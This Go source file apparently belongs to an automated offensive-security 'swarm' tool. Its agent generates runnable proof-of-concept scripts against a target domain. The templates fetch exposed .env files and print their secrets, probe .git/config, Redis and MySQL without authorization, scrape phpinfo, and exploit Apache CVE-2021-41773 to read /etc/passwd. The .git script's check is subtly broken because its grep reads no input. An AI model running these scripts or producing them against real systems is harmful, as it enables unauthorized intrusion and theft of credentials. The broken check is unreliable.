package poc_generator

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"hackit_ai_engine/swarm/core"
)

type PoCGeneratorAgent struct {
	name string
	desc string
}

func NewPoCGeneratorAgent() *PoCGeneratorAgent {
	return &PoCGeneratorAgent{
		name: "Agent-22: AI PoC Generator",
		desc: "Generates fully runnable Proof of Concept (PoC) scripts (Python/Bash/Curl) to verify and reproduce findings.",
	}
}

func (a *PoCGeneratorAgent) Name() string        { return a.name }
func (a *PoCGeneratorAgent) Description() string  { return a.desc }

func (a *PoCGeneratorAgent) Execute(state *core.SwarmState) error {
	state.Section("POC GENERATION PHASE")
	state.Log(a.Name(), "START", "Compiling actionable Proof of Concept scripts...")

	state.Mu.RLock()
	vulns := state.Vulns
	domain := state.Target.PrimaryDomain
	state.Mu.RUnlock()

	if len(vulns) == 0 {
		state.LogWarn(a.Name(), "WARN", "No vulns to generate PoCs for")
		return nil
	}

	start := time.Now()
	pocDir := filepath.Join("reports", "pocs", state.SessionID)
	os.MkdirAll(pocDir, 0755)

	state.StartSpinner(fmt.Sprintf("%sGenerating PoC scripts for %d vulnerabilities%s", core.Yellow, len(vulns), core.Reset))
	time.Sleep(80 * time.Millisecond)

	count := 0
	for _, v := range vulns {
		var poc string
		filename := ""

		switch {
		case v.ID == "MISCONF-001":
			filename = "env_leak_poc.sh"
			poc = fmt.Sprintf(`#!/bin/bash
# PoC: Exposed .env file
# Target: %s
curl -s -o /tmp/env_check.txt "http://%s/.env"
if grep -q "DB_PASSWORD\|API_KEY\|SECRET" /tmp/env_check.txt 2>/dev/null; then
  echo "[VULNERABLE] .env file contains secrets!"
  cat /tmp/env_check.txt
else
  echo "[SECURE] .env not exposed or empty"
fi
rm -f /tmp/env_check.txt
`, domain, domain)

		case v.ID == "MISCONF-002":
			filename = "git_leak_poc.sh"
			poc = fmt.Sprintf(`#!/bin/bash
# PoC: Exposed .git repository
# Target: %s
curl -s "http://%s/.git/config" | head -20
if grep -q "\[core\]" 2>/dev/null; then
  echo "[VULNERABLE] .git/config accessible"
  echo "Try: git-dumper http://%s/.git/ /tmp/repo/"
else
  echo "[SECURE] .git not exposed"
fi
`, domain, domain, domain)

		case v.Port == 6379:
			filename = "redis_poc.py"
			poc = fmt.Sprintf(`#!/usr/bin/env python3
# PoC: Redis unauthorized access
# Target: %s
import socket
s = socket.socket()
s.settimeout(5)
s.connect(("%s", 6379))
s.send(b"INFO\\r\\n")
resp = s.recv(4096)
if b"redis_version" in resp:
  print("[VULNERABLE] Redis accessible without auth")
  print(resp.decode(errors='ignore')[:500])
else:
  print("[SECURE] Redis requires authentication")
s.close()
`, domain, domain)

		case v.Port == 3306:
			filename = "mysql_poc.py"
			poc = fmt.Sprintf(`#!/usr/bin/env python3
# PoC: MySQL exposed to internet
# Target: %s
import socket
s = socket.socket()
s.settimeout(5)
try:
  s.connect(("%s", 3306))
  banner = s.recv(1024)
  print("[VULNERABLE] MySQL port open. Banner:", banner)
except:
  print("[SECURE] MySQL port closed/filtered")
s.close()
`, domain, domain)

		case v.ID == "MISCONF-PHPINFO":
			filename = "phpinfo_poc.sh"
			poc = fmt.Sprintf(`#!/bin/bash
# PoC: Exposed phpinfo()
# Target: %s
curl -s "http://%s/phpinfo.php" | grep -oP '<tr><td class="e">[^<]+</td><td class="v">[^<]+</td></tr>' | head -20
`, domain, domain)

		case strings.HasPrefix(v.ID, "CVE-2021-41773"):
			filename = "apache_path_traversal_poc.sh"
			poc = fmt.Sprintf(`#!/bin/bash
# PoC: CVE-2021-41773 Apache Path Traversal
# Target: %s
curl -s --path-as-is "http://%s/cgi-bin/.%%2e/%%2e%%2e/%%2e%%2e/etc/passwd"
`, domain, domain)

		default:
			filename = fmt.Sprintf("poc_%s.sh", strings.ToLower(v.ID))
			poc = fmt.Sprintf(`#!/bin/bash
# PoC: %s (%s)
# Target: %s
# CVSS: %.1f
echo "Vulnerability: %s"
echo "Description: %s"
echo "Evidence: %s"
`, v.Name, v.ID, domain, v.CVSS, v.Name, v.Description, v.Evidence)
		}

		if filename != "" && poc != "" {
			pocPath := filepath.Join(pocDir, filename)
			os.WriteFile(pocPath, []byte(poc), 0755)
			count++
		}
	}

	state.StopSpinner()

	elapsed := time.Since(start).Round(time.Millisecond)
	state.LogOk(a.Name(), "RESULT", fmt.Sprintf("Generated %d PoC scripts in %s in %s", count, pocDir, elapsed))
	return nil
}
